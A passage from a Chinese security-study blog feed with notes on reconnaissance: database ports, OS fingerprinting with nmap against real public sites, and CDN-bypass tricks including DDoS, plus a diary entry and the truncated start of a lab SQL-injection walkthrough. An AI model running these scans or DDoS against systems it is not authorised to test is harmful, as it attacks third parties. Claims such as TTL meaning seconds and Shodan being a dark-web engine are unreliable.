dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2022年2月7</span>日<br><br>归属:政务行业<br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <categories>
      
      <category>实习之数据安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>第三方层面</title>
    <link href="/2022/07/22/%E7%AC%AC%E4%B8%89%E6%96%B9%E5%B1%82%E9%9D%A2/"/>
    <url>/2022/07/22/%E7%AC%AC%E4%B8%89%E6%96%B9%E5%B1%82%E9%9D%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="第三方层面"><a href="#第三方层面" class="headerlink" title="第三方层面"></a>第三方层面</h1><h2 id="1-常见的第三方"><a href="#1-常见的第三方" class="headerlink" title="1.常见的第三方"></a>1.常见的第三方</h2><ul><li>Jboss</li><li>PHPmyadmin</li><li>vsftpd</li><li>teamview</li><li>自己下载的其他软件（比如谷歌浏览器）</li></ul><h2 id="2-如何判断第三方平台"><a href="#2-如何判断第三方平台" class="headerlink" title="2.如何判断第三方平台"></a>2.如何判断第三方平台</h2><p>&emsp;&emsp;不同的第三方平台所判断的方法和标准都不相同，譬如phpmyadmin的判定是可以通过网站扫描其目录来判定，如果网站扫描不出来，可以尝试端口等方法去判断。如果nmap扫描不出来，可能是有第三方防护软件（安全狗）等拦截。还有可能是对方服务部署在内网。</p><p>&emsp;&emsp;总而言之，判断第三方层面需要多层面多方法的进行，需要进行积累和沉淀。</p><h2 id="3-为什么要识别第三方平台或软件"><a href="#3-为什么要识别第三方平台或软件" class="headerlink" title="3.为什么要识别第三方平台或软件"></a>3.为什么要识别第三方平台或软件</h2><p>&emsp;&emsp;不同的第三方软件或工具存在不同的漏洞、识别到更多的信息对收集到的漏洞也就越多。</p><h2 id="4-第三方平台或软件被攻击的危害"><a href="#4-第三方平台或软件被攻击的危害" class="headerlink" title="4.第三方平台或软件被攻击的危害"></a>4.第三方平台或软件被攻击的危害</h2><p>  &emsp;&emsp;直接获取到软件的权限便于进一步的提权和攻击。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>数据库层面</title>
    <link href="/2022/07/21/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%B1%82%E9%9D%A2/"/>
    <url>/2022/07/21/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%B1%82%E9%9D%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="数据库层面"><a href="#数据库层面" class="headerlink" title="数据库层面"></a>数据库层面</h1><h2 id="1-常见的数据库类型"><a href="#1-常见的数据库类型" class="headerlink" title="1.常见的数据库类型"></a>1.常见的数据库类型</h2><h5 id="emsp-1-小型数据库"><a href="#emsp-1-小型数据库" class="headerlink" title="&emsp;1)小型数据库"></a>&emsp;1)小型数据库</h5><p>   &emsp;&emsp; Access</p><h5 id="emsp-2）中型数据库"><a href="#emsp-2）中型数据库" class="headerlink" title="&emsp;2）中型数据库"></a>&emsp;2）中型数据库</h5><p>  &emsp;&emsp;  MySQL</p><h5 id="emsp-3）大型数据库"><a href="#emsp-3）大型数据库" class="headerlink" title="&emsp;3）大型数据库"></a>&emsp;3）大型数据库</h5><p>  &emsp;&emsp;  Oracle、SQL Server</p><h2 id="2-数据库区分"><a href="#2-数据库区分" class="headerlink" title="2.数据库区分"></a>2.数据库区分</h2><h5 id="emsp-1）数据库常见搭配"><a href="#emsp-1）数据库常见搭配" class="headerlink" title="&emsp;1）数据库常见搭配"></a>&emsp;1）数据库常见搭配</h5><p>&emsp;&emsp;往往由于兼容性的问题，不同数据库所配合的搭建语言是不一样的，一般都是选取兼容性比较高的搭配，比如：</p><p>&emsp;&emsp;&emsp;ASP+Access，sql server （windows）</p><p>&emsp;&emsp;&emsp;PHP+Mysql（linux、windows） 端口：3306</p><p>&emsp;&emsp;&emsp;ASPX+Mssql(windows) 端口：1433</p><p>&emsp;&emsp;&emsp;Jsp+Mssql（windows）,oracle （linux、windows）端口：1521</p><p>&emsp;&emsp;&emsp;Python+Mongodb （linux、windows）</p><p>  &emsp;&emsp;注：其中的access和mssql是windows官方的数据库，所以是不支持Liunx系统的。</p><h5 id="emsp-2）常见的数据库端口号（默认）"><a href="#emsp-2）常见的数据库端口号（默认）" class="headerlink" title="&emsp;2）常见的数据库端口号（默认）"></a>&emsp;2）常见的数据库端口号（默认）</h5><h6 id="emsp-emsp-关系型数据库："><a href="#emsp-emsp-关系型数据库：" class="headerlink" title="&emsp;&emsp;关系型数据库："></a>&emsp;&emsp;关系型数据库：</h6><p>&emsp;&emsp;&emsp;sql server——–端口：1433</p><p>&emsp;&emsp;&emsp;Mysql————-端口：3306</p><p>&emsp;&emsp;&emsp;Oracle————-端口：1521</p><p>&emsp;&emsp;&emsp;PostgreSQL——–端口：5432</p><p>&emsp;&emsp;&emsp;SM达梦————-端口：5236</p><h6 id="emsp-emsp-非关系型数据库："><a href="#emsp-emsp-非关系型数据库：" class="headerlink" title="&emsp;&emsp;非关系型数据库："></a>&emsp;&emsp;非关系型数据库：</h6><p>&emsp;&emsp;&emsp;Mongodb———端口：27017</p><p>&emsp;&emsp;&emsp;Redis—————端口：6379</p><p>&emsp;&emsp;&emsp;Memcached——–端口：11211</p><h5 id="emsp-3）nmap扫描识别数据库类型"><a href="#emsp-3）nmap扫描识别数据库类型" class="headerlink" title="&emsp;3）nmap扫描识别数据库类型"></a>&emsp;3）nmap扫描识别数据库类型</h5><p><img src="/img/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%B1%82%E9%9D%A2/1.png"></p><p>&emsp;&emsp;其中的STATE是代表端口的状态，状态主要就分为几种：</p><p> &emsp;&emsp;&emsp; Open：端口处于开放状态</p><p> &emsp;&emsp;&emsp; Closed：端口处于关闭状态</p><p>  &emsp;&emsp;&emsp;Filtered：端口处于过了无法收到返回的probe状态</p><p>  &emsp;&emsp;&emsp;UnFiltered：端口收到返回的probe，但无法确认</p><p>  &emsp;&emsp;&emsp;Open/UnFiltered：端口处于开放或者未过滤状态</p><h2 id="3-数据库创建漏洞类型及攻击"><a href="#3-数据库创建漏洞类型及攻击" class="headerlink" title="3.数据库创建漏洞类型及攻击"></a>3.数据库创建漏洞类型及攻击</h2><p>&emsp;&emsp;&emsp;数据库的不同代表其结构和相关的编译语言不同，每个数据库，他的安全机制和写法结构都有少许的不一样，所以他产生和存在的漏洞也就不同。比如以Access与Mysql数据库进行比较，不仅仅有存储方式上的区别，也有结构方面的区别。数据库的结构，架构的不同，决定了我们所攻击的方法和入手的地方。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>操作系统层面</title>
    <link href="/2022/07/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%B1%82%E9%9D%A2/"/>
    <url>/2022/07/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%B1%82%E9%9D%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="操作系统层面"><a href="#操作系统层面" class="headerlink" title="操作系统层面"></a>操作系统层面</h1><h2 id="1-识别操作系统常见方法"><a href="#1-识别操作系统常见方法" class="headerlink" title="1.识别操作系统常见方法"></a>1.识别操作系统常见方法</h2><h5 id="1）通过网站识别"><a href="#1）通过网站识别" class="headerlink" title="1）通过网站识别"></a>1）通过网站识别</h5><p>window:</p><p>&emsp;&emsp;通过网站或通过扫描相关软件识别大小写对网页都没有影响，这种情况就可以认定为windows服务器，因为windows服务器不区分大小写。以小迪吧的某个界面（<a href="http://xiaodi8.com/?Id=211%EF%BC%89%E4%B8%BA%E4%BE%8B%EF%BC%9A">http://xiaodi8.com/?Id=211）为例：</a></p><p><img src="/img/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%B1%82%E9%9D%A2/1.png"></p><p><img src="/img/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%B1%82%E9%9D%A2/2.png"></p><p>&emsp;&emsp;通过图片可以看见，在输入网址的时候，输入id与ID都是能够访问网站的。</p><p>Linux:</p><p>&emsp;&emsp; Linux是区分大小写的，因此可以通过修改大小从而判断操作系统的类别。以“嵩基集团”的网址（<a href="http://www.hnsjjt.com/index.php%EF%BC%89%E4%B8%BA%E4%BE%8B%E5%AD%90">http://www.hnsjjt.com/index.php）为例子</a></p><p><img src="/img/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%B1%82%E9%9D%A2/3.png"></p><p><img src="/img/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%B1%82%E9%9D%A2/5.png"></p><p>&emsp;&emsp;通过图片可以看见，在输入网址的时候，php和phP的最终效果是不一样的，当改为大写P的时候，访问网站会反馈出not found的结果。</p><h5 id="2）TTL值识别（不建议，存在一定标准问题）"><a href="#2）TTL值识别（不建议，存在一定标准问题）" class="headerlink" title="2）TTL值识别（不建议，存在一定标准问题）"></a>2）TTL值识别（不建议，存在一定标准问题）</h5><p>&emsp;&emsp;例如：</p><p>windows NT/2000     TLL：128</p><p>windows 95/98           TLL：32</p><p>win7                               TLL：64</p><p>unix                                 TLL:255</p><p>Linux                               TLL：64</p><p><img src="/img/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%B1%82%E9%9D%A2/6.png"></p><p>&emsp;&emsp;当然，并不是全部的TTL都能反馈出操作系统的类型，当我们ping百度的网站时，显示的TTL值是56，TL是生存时间(Time To Live) 简单点说就是数据包的生命周期，TTL=56，就是该数据只能在通讯线路里存活56秒，并没有反馈出所谓的操作系统类型，当我们ping广州大学的网址时，也可能出现没有所谓TTL值的情况。<br>        &emsp;&emsp;简单来说，这个TTL是很又有用的，它能把无主数据包自动消灭。如果无主数据包不会自动消灭，那么大量的无主数据包就会堵在通讯线路上，导致网络堵塞</p><h5 id="3）nmap识别"><a href="#3）nmap识别" class="headerlink" title="3）nmap识别"></a>3）nmap识别</h5><p>&emsp;&emsp;这里我使用的是kali自带的nmap，使用命令：nmap -O 183.232.231.174（也就是百度的网址）</p><p><img src="/img/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%B1%82%E9%9D%A2/7.png"></p><p>&emsp;&emsp;可以看见，百度所使用的操作系统类型为Linux的系统，如果我们想发起操作系统层面的攻击的话，即就从对应Linux操作系统类型的漏洞入手。</p><h2 id="2-识别操作系统的区别和意义"><a href="#2-识别操作系统的区别和意义" class="headerlink" title="2.识别操作系统的区别和意义"></a>2.识别操作系统的区别和意义</h2><h5 id="1）区别"><a href="#1）区别" class="headerlink" title="1）区别"></a>1）区别</h5><p>windows：</p><p>&emsp;&emsp;对于windows而言，Windows系统内置了许多本地用户组，这些用户组本身都已经被赋予一些权限（permissions),它们具有管理本地计算机或访问本地资源的权限。只要用户账户加入到这些本地组内，这回用户账户也将具备该组所拥有的权限。</p><p>&emsp;&emsp; 默认情况下，系统为用户分了7个组，并给每个组赋予不同的操作权限，管理员组(Administrators)、高权限用户组(Power Users)、普通用户组(Users)、备份操作组(Backup Operators)、文件复制组(Replicator)、来宾用户组(Guests)，身份验证用户组(Ahthenticated users)其中备份操作组和文件复制组为维护系统而设置，平时不会被使用。</p><p> &emsp;&emsp;除了上面提到的7个默认权限分组，系统还存在一些特殊权限成员，这些成员是为了特殊用途而设置，分别是:SYSTEM(系统)、Trustedinstaller（信任程序模块）、Everyone(所有人)、CREATOR OWNER(创建者) 等，这些特殊成员不被任何内置用户组吸纳，属于完全独立出来的账户。</p><p> &emsp;&emsp;真正拥有“完全访问权”的只有一个成员:SYSTEM。这个成员是系统产生的，真正拥有整台计算机管理权限的账户，一般的操作是无法获取与它等价的权限的</p><p>Linux：</p><p>&emsp;&emsp; 对于Linux系统而言。Linux/Unix是一个多用户、多任务的操作系统；用户在系统中是分角色的，在Linux系统中，由于角色的不同，权限和所完成的任务也不同；值得注意的是用户的角色是通过UID和GID识别的；特别是UID，在运维工作中，一个UID是唯一标识一个系统用户的账号，其中超级用户root（0） 程序用户（1<del>499） 普通用户（500</del>65535）。</p><p>  &emsp;&emsp;具体的详细区别可以自行百度，这个会有很好的介绍。</p><h5 id="2）意义"><a href="#2）意义" class="headerlink" title="2）意义"></a>2）意义</h5><p>   &emsp;&emsp; 围绕着不同的操作系统进行不同的漏洞查找和搜寻，不同操作系统的漏洞体现存在差异，所以当我们判断出是哪种操作系统类型时，我们就可以“对症下药”。</p><h2 id="3-操作系统层面漏洞类型"><a href="#3-操作系统层面漏洞类型" class="headerlink" title="3.操作系统层面漏洞类型"></a>3.操作系统层面漏洞类型</h2><ul><li>从漏洞攻击条件分类：远程，本地（远程执行，本地权限提升等） </li><li>从漏洞攻击对象分类：自带，三方（缓冲器溢出，IE漏洞，IIS漏洞等） </li><li>从漏洞影响危害分类：权限丢失，数据丢失，文件被操作，服务器被控制等 </li><li>从漏洞安全修复分类：已知漏洞，未知漏洞，已知攻击，未知攻击等</li><li>…</li></ul><h2 id="4-操作系统层面漏洞影响范围"><a href="#4-操作系统层面漏洞影响范围" class="headerlink" title="4.操作系统层面漏洞影响范围"></a>4.操作系统层面漏洞影响范围</h2><ul><li>获取权限</li><li>影响服务器运行</li><li>使服务器崩溃</li></ul>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>信息收集之CDN相关技术</title>
    <link href="/2022/07/14/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8BCDN%E7%9B%B8%E5%85%B3%E6%8A%80%E6%9C%AF/"/>
    <url>/2022/07/14/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8BCDN%E7%9B%B8%E5%85%B3%E6%8A%80%E6%9C%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="信息收集之CDN相关技术"><a href="#信息收集之CDN相关技术" class="headerlink" title="信息收集之CDN相关技术"></a>信息收集之CDN相关技术</h1><h4 id="1-什么是CDN"><a href="#1-什么是CDN" class="headerlink" title="1.什么是CDN"></a>1.什么是CDN</h4><p>&emsp;&emsp;CDN的全称是Content Delivery Network，即<a href="https://baike.baidu.com/item/%E5%86%85%E5%AE%B9%E5%88%86%E5%8F%91%E7%BD%91%E7%BB%9C/4034265">内容分发网络</a>。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。但是在安全测试的过程中，若目标存在CDN服务，就会影响到后续的安全测试过程。</p><p><img src="/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8BCDN%E7%9B%B8%E5%85%B3%E6%8A%80%E6%9C%AF/1.jpg" alt="1"></p><h4 id="2-如何判断是否存在CDN"><a href="#2-如何判断是否存在CDN" class="headerlink" title="2.如何判断是否存在CDN"></a>2.如何判断是否存在CDN</h4><h5 id="emsp-方法一：使用超级ping网页工具"><a href="#emsp-方法一：使用超级ping网页工具" class="headerlink" title="&emsp;方法一：使用超级ping网页工具"></a>&emsp;方法一：使用超级ping网页工具</h5><p>&emsp;&emsp;原理：使用不同地区ping相同的服务器，看 ip是否一致。</p><p>&emsp;&emsp;（<a href="https://ping.chinaz.com/%EF%BC%89">https://ping.chinaz.com/）</a></p><ul><li><p>无CDN：<br>在ping的过程中，所有返回的IP地址都是相同的，这说明没有利用到CDN技术</p><p><img src="/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8BCDN%E7%9B%B8%E5%85%B3%E6%8A%80%E6%9C%AF/2.jpg"></p></li><li><p>有CDN</p><p>在ping的过程中，返回的IP地址是存在不同的，这说明用来多个储存服务器，也就利用到CDN技术</p><p><img src="/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8BCDN%E7%9B%B8%E5%85%B3%E6%8A%80%E6%9C%AF/3.jpg"></p></li></ul><h5 id="emsp-方法二：命令行查询"><a href="#emsp-方法二：命令行查询" class="headerlink" title="&emsp;方法二：命令行查询"></a>&emsp;方法二：命令行查询</h5><p>&emsp;&emsp;在window中使用cmd命令板的nslookup命令，可以查看目标是否有多个IP地址，如果有，则可能是使用了CDN服务。</p><p>&emsp;&emsp;nslookup：用于查询DNS的记录，查询域名解析是否正常，在网络故障时用来诊断网络问题。nslookup是一个程序的名字，这个程序让因特网服务器管理员或任何的计算机用户输入一个主机名（举例来说，“whatis.com.cn”）并发现相应的IP地址。它也会相反的名字查找为一个你指定的 IP 住址找出主机名。</p><p><img src="/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8BCDN%E7%9B%B8%E5%85%B3%E6%8A%80%E6%9C%AF/4.jpg"></p><p>&emsp;&emsp;讲道理，看到有些博客写的能分辨，但是在使用的过程中，我是一脸懵逼的，我感觉他并不完全准确，还不如用网页版的ping来判断，个人感觉不好用。</p><h4 id="3-常见的CDN绕过方法"><a href="#3-常见的CDN绕过方法" class="headerlink" title="3.常见的CDN绕过方法"></a>3.常见的CDN绕过方法</h4><h5 id="emsp-1）子域名查询"><a href="#emsp-1）子域名查询" class="headerlink" title="&emsp;1）子域名查询"></a>&emsp;1）子域名查询</h5><p>&emsp;&emsp;原理：其实CDN技术是需要花钱购买和维护的，所以除非大公司，一般的公司只会用CDN技术覆盖到访问量比较高的，但是不会对子站做CDN，所以我们可以通过子域名查询该网站的真实IP地址。（穷确实是好欺负）</p><p>&emsp;&emsp;（子域名查询网站：<a href="https://www.dnsgrep.cn/%EF%BC%89">https://www.dnsgrep.cn/）</a></p><p><img src="/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8BCDN%E7%9B%B8%E5%85%B3%E6%8A%80%E6%9C%AF/5.jpg"></p><p>&emsp;&emsp;查个thai.baidu.com,看来像百度一样的大公司也不不一定会全部覆盖呀。找不常用的子域名最好，这里thai.baidu.com后面还是有几个的，但是相对来说少了很多类型了。</p><p><img src="/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8BCDN%E7%9B%B8%E5%85%B3%E6%8A%80%E6%9C%AF/6.jpg"></p><h5 id="emsp-2）邮件服务查询"><a href="#emsp-2）邮件服务查询" class="headerlink" title="&emsp;2）邮件服务查询"></a>&emsp;2）邮件服务查询</h5><p>&emsp;&emsp;很多公司内部都会有一个自己用的邮箱服务器，由于邮箱服务器一般都是公司内部人去访问，所以大部分不做CDN。因此，我们就可以根据对方邮件服务器给我们发送的邮件，来判断对方的IP地址。</p><h5 id="emsp-3）国外地址查询"><a href="#emsp-3）国外地址查询" class="headerlink" title="&emsp;3）国外地址查询"></a>&emsp;3）国外地址查询</h5><p>&emsp;&emsp;原理其实和邮件服务查询差不多，有些公司面对的对象客户是国内，所以对国外的用户而言基本不会花钱给他们搞个CDN，所以我们可以尝试用从国外访问国内的网站就很可能直接访问的就是主站的真实ip地址。</p><p>&emsp;&emsp;（<a href="https://tools.ipip.net/cdn.php%EF%BC%89%E8%BF%99%E7%8E%A9%E6%84%8F%E8%A6%81%E6%B3%A8%E5%86%8C%EF%BC%8C%E6%88%91%E6%B2%A1%E8%AF%95%E8%BF%87%EF%BC%8C%E8%B0%A8%E6%85%8E%E4%B8%80%E5%AE%9A%E7%9A%84%E5%A5%BD%EF%BC%8C%E4%BD%86%E6%98%AF%E7%9C%8B%E4%BA%86%E5%87%A0%E4%B8%AA%E5%8D%9A%E4%B8%BB%E7%9A%84%E7%A1%AE%E5%AE%9E%E8%83%BD%E7%94%A8%E3%80%82">https://tools.ipip.net/cdn.php）这玩意要注册，我没试过，谨慎一定的好，但是看了几个博主的确实能用。</a></p><h5 id="emsp-4）遗留文件，扫描全网查询"><a href="#emsp-4）遗留文件，扫描全网查询" class="headerlink" title="&emsp;4）遗留文件，扫描全网查询"></a>&emsp;4）遗留文件，扫描全网查询</h5><p>&emsp;&emsp;遗留文件，例如phpinfo.php页面，找到遗留的ip地址。扫描全网，从各个地区访问网站，收集ip地址，再从中找出真实ip。</p><p>&emsp;&emsp;扫描工具：fuckcdn，zmap</p><h5 id="emsp-5）黑暗引擎搜索特定文件"><a href="#emsp-5）黑暗引擎搜索特定文件" class="headerlink" title="&emsp;5）黑暗引擎搜索特定文件"></a>&emsp;5）黑暗引擎搜索特定文件</h5><p>&emsp;&emsp;黑暗搜索引擎是一种工具，可让您在暗网上查找隐藏信息。暗网有许多不同类型的暗网搜索引擎，每个都有它的特色。例如，有些暗网搜索引擎的搜索能力比其他的好。有些可以专门搜索securedrop，而有些搜索引擎会找到有毒品或网络犯罪活动等非法内容的暗网网站。而其他的则更加普遍，几乎可以找到暗网的任何内容。（有风险，但是确实有效）</p><p>&emsp;&emsp;（<a href="https://www.shodan.io/%EF%BC%89">https://www.shodan.io/）</a></p><h5 id="emsp-6）DNS历史记录查询"><a href="#emsp-6）DNS历史记录查询" class="headerlink" title="&emsp;6）DNS历史记录查询"></a>&emsp;6）DNS历史记录查询</h5><p>&emsp;&emsp;站点在使用CDN服务前，真实的ip地址可能会被DNS记录，所以我们可以通过查看CDN历史找到目标真实的ip</p><p>&emsp;&emsp;（<a href="https://dnsdb.io/zh-cn/%EF%BC%89">https://dnsdb.io/zh-cn/）</a></p><p><img src="/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8BCDN%E7%9B%B8%E5%85%B3%E6%8A%80%E6%9C%AF/7.jpg"></p><h5 id="emsp-7）DDOS攻击查询"><a href="#emsp-7）DDOS攻击查询" class="headerlink" title="&emsp;7）DDOS攻击查询"></a>&emsp;7）DDOS攻击查询</h5><p>&emsp;&emsp;这个很好理解，其实每一个CDN的流量都存在上限的，假设他能承载100个人访问，我们使用DDOS伪造一万个人去访问，由于CDN的流量限制，耗费完了之后，就是真实ip地址</p><p>&emsp;&emsp;讲道理，除非是公司允许，别轻易使用，兄弟，要吃牢饭滴！！！</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>等保暂更</title>
    <link href="/2022/07/13/%E7%AD%89%E4%BF%9D%E6%9A%82%E6%9B%B4/"/>
    <url>/2022/07/13/%E7%AD%89%E4%BF%9D%E6%9A%82%E6%9B%B4/</url>
    
    <content type="html"><![CDATA[<h1 id="等保暂更"><a href="#等保暂更" class="headerlink" title="等保暂更"></a>等保暂更</h1><p>&emsp;&emsp;等保文字内容比较多，现在还没太多时间更新（要看的东西太多了，又不像技术层面，要整理太耗费时间了），主要研究方向还是web安全的渗透部分，等以后有可以时间再更吧，一定会更的，不更是小狗（汪汪汪）！</p><center><img src="/img/%E7%AD%89%E4%BF%9D%E6%9A%82%E6%9B%B4/1.png" style="zoom: 150%;" /></center>]]></content>
    
    
    <categories>
      
      <category>等级保护</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>安全物理换机测评要求及方法</title>
    <link href="/2022/07/12/%E5%AE%89%E5%85%A8%E7%89%A9%E7%90%86%E6%8D%A2%E6%9C%BA%E6%B5%8B%E8%AF%84%E8%A6%81%E6%B1%82%E5%8F%8A%E6%96%B9%E6%B3%95/"/>
    <url>/2022/07/12/%E5%AE%89%E5%85%A8%E7%89%A9%E7%90%86%E6%8D%A2%E6%9C%BA%E6%B5%8B%E8%AF%84%E8%A6%81%E6%B1%82%E5%8F%8A%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="安全物理换机测评要求及方法"><a href="#安全物理换机测评要求及方法" class="headerlink" title="安全物理换机测评要求及方法"></a>安全物理换机测评要求及方法</h1><p><strong>注：参考网址为<a href="https://www.cnblogs.com/quqibinggan/p/15607271.html#:~:text=%E4%BF%9D%E9%9A%9C%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E5%AF%B9%E8%B1%A1,%E6%89%80%E6%9C%89%E5%AE%89%E5%85%A8%E7%9A%84%E5%9F%BA%E7%A1%80%E3%80%82">https://www.cnblogs.com/quqibinggan/p/15607271.html</a></strong></p><h2 id="1-保护对象"><a href="#1-保护对象" class="headerlink" title="1.保护对象"></a>1.保护对象</h2><p>​        &emsp;&emsp;等级保护对象是由计算机或其他信息终端及相关设备组成的按照一定的规则和程序对信息进行收集、存储、传输、交换、处理的系统。主要包括基础信息网络、云计算平台/系统、大数据应用/平台/资源、物联网、工业控制系统和采用移动互联网技术的系统等。</p><p>​        &emsp;&emsp;保障等级保护对象设备保护对象设备的物理安全，包括防止设备被破坏，被盗用，保障物理环境的条件，确保设备正常运行，减少技术故障等等，是所有安全的基础。通常等级保护对象的相关设备均集中存放在机房中，通过其他物理辅助设施（如门禁，空调等）保障他们的安全。</p><h2 id="2-物理安全"><a href="#2-物理安全" class="headerlink" title="2.物理安全"></a>2.物理安全</h2><p>​        &emsp;&emsp;安全物理环境针对物理机房提出了安全控制要求，主要对象为物理环境，物理设备和物理设施等；涉及的安全控制点包括：</p><p><img src="/img/%E5%AE%89%E5%85%A8%E7%89%A9%E7%90%86%E6%8D%A2%E6%9C%BA%E6%B5%8B%E8%AF%84%E8%A6%81%E6%B1%82%E5%8F%8A%E6%96%B9%E6%B3%95/1.png"></p>]]></content>
    
    
    <categories>
      
      <category>等级保护</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>web前言</title>
    <link href="/2022/07/11/web%E5%89%8D%E8%A8%80/"/>
    <url>/2022/07/11/web%E5%89%8D%E8%A8%80/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&emsp;&emsp;在之前所提到的中间件，网站源码等问题以外，攻击者还能够利用操作系统、数据库等不同的模板进行对应的攻击操作。</p><p><img src="/img/web%E5%89%8D%E8%A8%80/1.png"></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>日记——夕阳</title>
    <link href="/2022/07/11/%E5%A4%95%E9%98%B3/"/>
    <url>/2022/07/11/%E5%A4%95%E9%98%B3/</url>
    
    <content type="html"><![CDATA[<h1 id="日记——夕阳"><a href="#日记——夕阳" class="headerlink" title="日记——夕阳"></a>日记——夕阳</h1><p>&emsp;&emsp;跑完步后浅拍下夕阳，确实是个养老的好地方。在夕阳下，两个人坐在太师椅上，也不说话，就摇啊摇，多是一件美事啊</p><p><img src="/img/%E5%A4%95%E9%98%B3/0.jpg"></p><p><img src="/img/%E5%A4%95%E9%98%B3/1.jpg"></p><p><img src="/img/%E5%A4%95%E9%98%B3/2.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>日记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>加密编码渗透演示（sql注入类型）</title>
    <link href="/2022/07/11/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E6%B8%97%E9%80%8F%E6%BC%94%E7%A4%BA%EF%BC%88sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%EF%BC%89/"/>
    <url>/2022/07/11/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E6%B8%97%E9%80%8F%E6%BC%94%E7%A4%BA%EF%BC%88sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="加密编码渗透演示（sql注入类型）"><a href="#加密编码渗透演示（sql注入类型）" class="headerlink" title="加密编码渗透演示（sql注入类型）"></a>加密编码渗透演示（sql注入类型）</h1><h4 id="1-打开题目"><a href="#1-打开题目" class="headerlink" title="1.打开题目"></a>1.打开题目</h4><p>&emsp;&emsp;这里使用的是墨者学院的靶场（<a href="https://www.mozhe.cn/%EF%BC%89">https://www.mozhe.cn/）</a></p><p>&emsp;&emsp;啥都好，就是要金币，太不友好了，不给白嫖！！！！</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E6%B8%97%E9%80%8F%E6%BC%94%E7%A4%BA%EF%BC%88sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%EF%BC%89/1.jpg"></p><h4 id="2-进入网页"><a href="#2-进入网页" class="headerlink" title="2.进入网页"></a>2.进入网页</h4><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E6%B8%97%E9%80%8F%E6%BC%94%E7%A4%BA%EF%BC%88sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%EF%BC%89/2.jpg"></p><h4 id="3-查找切入点"><a href="#3-查找切入点" class="headerlink" title="3.查找切入点"></a>3.查找切入点</h4><p>&emsp;&emsp;表面没啥，但是注意到下面有个维护通知，点开看看</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E6%B8%97%E9%80%8F%E6%BC%94%E7%A4%BA%EF%BC%88sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%EF%BC%89/2.5.jpg" alt="2.5"></p><p>&emsp;&emsp;可以看见为new/php格式，我们尝试退回到new看看有没有发现</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E6%B8%97%E9%80%8F%E6%BC%94%E7%A4%BA%EF%BC%88sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%EF%BC%89/3.jpg"></p><p>&emsp;&emsp;哦吼，一回退发现了list.zip，解压后是个php文件，这就打开</p><h4 id="4-解读代码"><a href="#4-解读代码" class="headerlink" 